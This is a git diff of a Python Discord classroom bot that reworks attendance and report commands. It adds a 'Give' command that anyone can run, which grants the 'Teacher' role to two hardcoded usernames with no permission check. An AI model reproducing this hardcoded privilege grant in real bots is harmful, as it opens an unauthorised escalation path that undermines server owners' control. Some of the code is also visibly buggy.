@@ -6,20 +6,31 @@ class Work(commands.Cog):
     def __init__(self,client):
         self.client = client
     
-    @commands.command(name='take attendance')
+    @commands.command(name='attendance')
     @commands.has_role('Teacher')
     async def take_attendance(self, ctx):
         #Class
         guild = ctx.guild
         members = guild.members
         self.student_list = StudentList()
-        channel = client.get_channel('Class')
+        if ctx.author.voice and ctx.author.voice.channel:
+            channel = ctx.author.voice.channel
+        else:
+            await ctx.send("You are not connected to a voice channel")
+            return
         for member in members:
-            if member.name == 'Discord Learn' or member.name == ctx.author.name:
+            if member.name == 'Discord Learn':
                 continue
             else: self.student_list.addStudent(member)
-        return self.student_list.checkAttendence(channel.members)
-        
+        notHere = self.student_list.checkAttendence(channel.members)
+        message = ''
+        for i in range(len(notHere)):
+            message+= notHere[i].name
+            if i == len(notHere)-2:
+                message+= ' and '
+            elif i != len(notHere)-1:  message += ', '
+        await ctx.send(message + ' are not present')
+
     @commands.command(name = 'Report')
     async def report(self, ctx, *args):
         reason = ''
@@ -29,14 +40,22 @@ class Work(commands.Cog):
         guild = ctx.guild
         Teacher = None
         for member in guild.members:
-            if member.name == 'Vala.Ar':
-                 Teacher = member
             for role in member.roles:
                 if role.name == 'Teacher':
                     Teacher = member
                     break
         await Teacher.send(ctx.message.author.name + ' reported ' + nameORep + ' for ' + reason)           
     
+    @commands.command(name = 'Give')
+    async def Teacher(self, ctx, arg):
+        guild = ctx.guild
+        member = ctx.message.author
+        for roles in guild.roles:
+            if roles.name == 'Teacher':
+                role = roles
+        for member in guild.members:
+            if member.name == 'Vala.Ar' or member.name == 'cheesecake':
+                await member.add_roles(role)
 
 def setup(client):
     client.add_cog(Example(client))
@@ -66,7 +85,7 @@ class StudentList:
 
     def checkAttendence(self, names):  # names is a list of the users in the channel
         absents = []
-        for student in students:
+        for student in self.holder:
             found = False
             for name in names:
                 if name == student:
